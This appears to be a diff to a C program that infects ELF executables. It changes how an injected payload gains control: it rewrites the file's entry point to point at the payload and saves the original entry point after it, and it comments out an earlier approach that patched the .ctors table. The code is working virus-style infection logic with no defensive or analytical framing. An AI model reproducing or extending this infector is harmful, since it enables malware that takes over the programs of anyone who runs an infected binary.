@@ -69,7 +69,7 @@ int main(int argc, char *argv[]){
   //find the nearest power of 8 that will hold the payload
   size_t alignedPayloadSize;
   size_t alignment = programHeader->p_align;
-  for(alignedPayloadSize=alignment; alignedPayloadSize < payloadSize; alignedPayloadSize+=alignment){}
+  for(alignedPayloadSize=alignment; alignedPayloadSize < payloadSize + sizeof(ELFN(Addr)); alignedPayloadSize+=alignment){}
 
   //allocate space for the new program header table and the payload
   infectedSize = targetSize + alignedPayloadSize;
@@ -115,25 +115,30 @@ int main(int argc, char *argv[]){
     }
   }
 
+  //change the entry point to our payload
+  ELFN(Addr) oldEntryPoint = infectedElfHeader->e_entry;
+  infectedElfHeader->e_entry = payloadMemory;
+  *(ELFN(Addr)*)(infected + payloadOffset + payloadSize) = oldEntryPoint;
+
   //find the string table
-  ELFN(Shdr) *infectedStringTable = infectedSectionHeaderTable + infectedElfHeader->e_shstrndx;
-  char* infectedStringTableValues = infected + infectedStringTable->sh_offset;
+  //ELFN(Shdr) *infectedStringTable = infectedSectionHeaderTable + infectedElfHeader->e_shstrndx;
+  //char* infectedStringTableValues = infected + infectedStringTable->sh_offset;
 
-  //find the .ctors
-  ELFN(Shdr) *ctors;
-  i = 0;
-  for( i = 0, ctors = infectedSectionHeaderTable;
-       i < infectedElfHeader->e_shnum && strcmp(infectedStringTableValues + ctors->sh_name, ".ctors") != 0;
-       i++, ctors++ ){}
-  if( i >= infectedElfHeader->e_shnum){
-    fprintf(stderr, "Unable to locate the .ctors table. LAME!\n");
-    return -1;
-  }
+  ////find the .ctors
+  //ELFN(Shdr) *ctors;
+  //i = 0;
+  //for( i = 0, ctors = infectedSectionHeaderTable;
+  //     i < infectedElfHeader->e_shnum && strcmp(infectedStringTableValues + ctors->sh_name, ".ctors") != 0;
+  //     i++, ctors++ ){}
+  //if( i >= infectedElfHeader->e_shnum){
+  //  fprintf(stderr, "Unable to locate the .ctors table. LAME!\n");
+  //  return -1;
+  //}
 
-  //add our payload to the ctors
-  *(ELFN(Addr)*)(infected+ctors->sh_offset) = payloadMemory;
-  //*(((ELFN(Addr)*)(infected+ctors->sh_offset)) + 1) = -1;
-  *(((ELFN(Addr)*)(infected+ctors->sh_offset)) - 1) = -1;
+  ////add our payload to the ctors
+  //*(ELFN(Addr)*)(infected+ctors->sh_offset) = payloadMemory;
+  ////*(((ELFN(Addr)*)(infected+ctors->sh_offset)) + 1) = -1;
+  //*(((ELFN(Addr)*)(infected+ctors->sh_offset)) - 1) = -1;
 
 
   //write out the newly infected file
